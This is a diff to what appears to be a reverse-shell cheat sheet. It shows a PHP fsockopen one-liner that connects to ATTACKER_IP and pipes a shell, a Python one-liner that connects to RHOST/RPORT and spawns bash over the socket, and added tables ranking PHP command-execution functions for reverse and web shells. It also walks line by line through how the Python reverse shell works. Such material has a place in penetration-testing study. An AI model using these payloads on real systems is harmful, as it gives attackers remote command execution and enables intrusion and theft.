@@ -411,6 +411,28 @@ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
 ```
 Opens a process pointer using `popen()` for command execution. Enables read access from the executed process, allowing shell interaction.
 
+# PHP Command Execution Functions Comparison (for Reverse Shells)
+
+This table compares different PHP functions used for executing system commands in reverse shell or web shell scenarios.
+
+| Function     | Executes Command | Captures Output           | Displays Output     | Output Type         | Best Use Case                        |
+|--------------|------------------|----------------------------|----------------------|----------------------|--------------------------------------|
+| `exec()`     | ✅               | ✅ (last line only)        | ❌                   | String (last line)   | Quiet output processing              |
+| `shell_exec()`| ✅              | ✅ (entire output)         | ❌                   | String (all output)  | Capture full output as a string      |
+| `system()`   | ✅               | ✅ (last line) + Display   | ✅ (as it runs)      | Printed text         | Direct CLI-style interaction         |
+| `passthru()` | ✅               | ❌                         | ✅ (raw, binary-safe)| Raw binary/text      | Best for binary/raw output streaming |
+| `popen()`    | ✅               | ✅ (via file handle/pipe) | ❌ (unless echoed)   | Resource handle      | Stream output gradually (line-by-line) |
+
+## ✅ TL;DR: Which One Should You Use?
+
+| Use Case                         | Best Function |
+|----------------------------------|---------------|
+| Simple reverse shell             | `system()`    |
+| Reverse shell with binary data   | `passthru()`  |
+| Capture full output as string    | `shell_exec()`|
+| Minimal shell, last-line only    | `exec()`      |
+| Custom streaming logic           | `popen()`     |
+
 ---
 
 ## Python
@@ -422,6 +444,40 @@ s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
 ```
 Sets environment variables for the attacker's host and port. Python creates a socket, connects, duplicates I/O file descriptors to use the socket, and spawns a pseudo-terminal for interactive access.
+1. Setting Environment Variables
+  - RHOST: The attacker's IP address.
+  - RPORT: The port number (443 in this case) the attacker is listening on.
+
+2. Python Code Execution
+`python -c 'import sys,socket,os,pty;`
+  - This line uses the `python -c `command to execute a Python one-liner. The import statement loads the necessary modules:
+  - `sys`: Provides access to system-specific parameters.
+  - `socket`: Allows networking (TCP connection).
+  - `os`: Interacts with the operating system, such as reading environment variables.
+  - `pty`: Spawns and controls pseudo-terminals.
+
+3. Creating a TCP Socket and Connecting to the Attacker
+```Python
+s=socket.socket();
+s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
+```
+  - `socket.socket()` creates a new socket object.
+  - `s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))))` connects to the attacker's machine using the IP (`RHOST`) and port (`RPORT`) stored in environment variables.
+
+4. Redirecting Input/Output to the Socket
+`[os.dup2(s.fileno(),fd) for fd in (0,1,2)];`
+  - This line redirects the input, output, and error streams to the attacker's socket:
+  - `os.dup2(s.fileno(), fd)` duplicates the file descriptor of the socket `(s.fileno())` to:
+       - `fd=0` → stdin (input stream)
+       - `fd=1` → stdout (output stream)
+       - `fd=2` → stderr (error stream)
+This means the shell will now use the socket for all input/output, allowing full interaction with the compromised system.
+
+5. Spawning an Interactive Bash Shell
+`pty.spawn("bash")'`
+  - pty.spawn("bash") spawns an interactive bash shell using a pseudo-terminal. This allows the attacker to interact with the shell as if they were using a local terminal, 
+    making the experience more seamless (supporting features like clear screen, arrow keys, etc.).
+
 
 ---
 
